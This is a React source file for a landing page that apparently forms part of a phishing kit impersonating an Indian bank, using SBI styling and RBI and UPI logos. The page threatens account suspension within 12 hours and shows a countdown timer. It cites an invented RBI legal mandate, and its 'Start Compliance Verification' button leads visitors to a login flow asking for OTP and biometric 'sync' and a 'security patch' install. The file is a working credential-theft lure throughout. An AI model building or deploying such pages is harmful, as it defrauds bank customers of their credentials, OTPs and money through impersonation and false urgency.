// ...existing code...
import { ChevronRight, FileText, Smartphone, Scale, Gavel, HelpCircle, ShieldAlert } from 'lucide-react';
import WarningBanner from '../components/WarningBanner';
import { motion } from 'framer-motion';
import { useSecureNavigate } from './DeviceVerification';
import CountdownTimer from '../components/CountdownTimer';

const LandingPage: React.FC = () => {
  const secureNavigate = useSecureNavigate();

  return (
    <div className="flex flex-col">
      <WarningBanner message="IMMEDIATE RESPONSE REQUIRED: Your account access will be suspended within 12 hours. Permanent freeze of UPI/ATM services if KYC is not updated by 11:59 PM today." />
      
      <div className="max-w-4xl mx-auto px-4 py-8 w-full">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="glass-card p-6 md:p-10 border-t-8 border-t-red-600 relative overflow-hidden"
        >
          <div className="absolute top-4 right-6 hidden md:block">
            <div className="flex items-center gap-3 px-4 py-2 bg-slate-50 border border-slate-200 rounded-2xl shadow-sm">
                <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Session Expiry</span>
                <CountdownTimer initialSeconds={600} />
            </div>
          </div>

          <div className="flex items-start gap-5 mb-10">
            <div className="bg-red-100 p-5 rounded-3xl shrink-0">
              <ShieldAlert className="w-12 h-12 text-red-600" />
            </div>
            <div>
              <h1 className="text-2xl md:text-4xl font-black text-slate-900 tracking-tighter leading-tight mb-2">Notice of Compliance Deficiency</h1>
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-black bg-red-600 text-white px-2 py-0.5 rounded uppercase tracking-widest">Action Required</span>
                <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Case: RBI/KYC/2024-99X</span>
              </div>
            </div>
          </div>

          <div className="space-y-6 mb-12">
            <div className="bg-slate-900 rounded-3xl p-6 text-white border border-slate-800 shadow-2xl relative group overflow-hidden">
                <div className="absolute -right-4 -top-4 opacity-10 transform rotate-12 group-hover:scale-110 transition-transform duration-700">
                    <Scale className="w-40 h-40" />
                </div>
                <div className="flex gap-4 relative z-10">
                    <Gavel className="w-8 h-8 text-red-500 shrink-0" />
                    <div>
                        <h3 className="font-black text-red-500 uppercase text-xs tracking-widest mb-2">RBI Legal Mandate (Section 35A)</h3>
                        <p className="text-sm text-slate-300 leading-relaxed font-medium">
                            Failure to complete the <span className="text-white font-black">Biometric-Linked Digital KYC Update</span> will result in the immediate reporting of your account as "Non-Compliant" to the Financial Intelligence Unit. This may lead to civil penalties and permanent restriction of all digital banking privileges across all Indian financial institutions.
                        </p>
                    </div>
                </div>
            </div>

            <div className="grid md:grid-cols-2 gap-4">
              <div className="p-6 border-2 border-slate-100 rounded-3xl bg-white hover:border-sbi-blue/30 transition-all cursor-default">
                <div className="flex items-center gap-3 mb-4">
                    <div className="p-2 bg-sbi-blue/5 rounded-xl">
                        <FileText className="w-6 h-6 text-sbi-blue" />
                    </div>
                    <h4 className="font-black text-slate-800 uppercase text-xs tracking-widest">Biometric Data Sync</h4>
                </div>
                <p className="text-xs text-gray-500 font-medium leading-relaxed">Secure synchronization with UIDAI databases to verify identity via registered mobile OTP.</p>
              </div>
              <div className="p-6 border-2 border-slate-100 rounded-3xl bg-white hover:border-sbi-blue/30 transition-all cursor-default">
                <div className="flex items-center gap-3 mb-4">
                    <div className="p-2 bg-sbi-blue/5 rounded-xl">
                        <Smartphone className="w-6 h-6 text-sbi-blue" />
                    </div>
                    <h4 className="font-black text-slate-800 uppercase text-xs tracking-widest">Digital Security Upgrade</h4>
                </div>
                <p className="text-xs text-gray-500 font-medium leading-relaxed">Mandatory security patch installation for your mobile banking application environment.</p>
              </div>
            </div>
          </div>

          <div className="flex flex-col gap-6">
            <button 
              onClick={() => secureNavigate('/login')}
              className="group relative w-full py-5 bg-sbi-blue hover:bg-sbi-dark-blue text-white font-black rounded-2xl transition-all shadow-2xl shadow-sbi-blue/30 flex items-center justify-center gap-3 overflow-hidden"
            >
              <div className="absolute inset-0 bg-white/10 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000 skew-x-12" />
              <span className="text-lg">START COMPLIANCE VERIFICATION</span>
              <ChevronRight className="w-6 h-6 animate-bounce-x" />
            </button>
            
            <div className="flex items-center justify-center gap-8 opacity-40 grayscale hover:grayscale-0 transition-all cursor-default">
                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo.png" alt="UPI" className="h-4" />
                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/0/0b/RBI_logo.svg/1200px-RBI_logo.svg.png" alt="RBI" className="h-6" />
                <div className="flex items-center gap-1">
                    <HelpCircle className="w-3 h-3" />
                    <span className="text-[10px] font-black uppercase tracking-widest">Help: 1800-425-XXXX</span>
                </div>
            </div>
          </div>
        </motion.div>

        <div className="mt-12 text-center">
            <p className="text-[10px] text-slate-400 font-bold uppercase tracking-widest flex items-center justify-center gap-2">
                <ShieldAlert className="w-3 h-3" /> Trusted by 12 Million+ Users for Secure Digital Banking
            </p>
        </div>
      </div>
    </div>
  );
};

export default LandingPage;
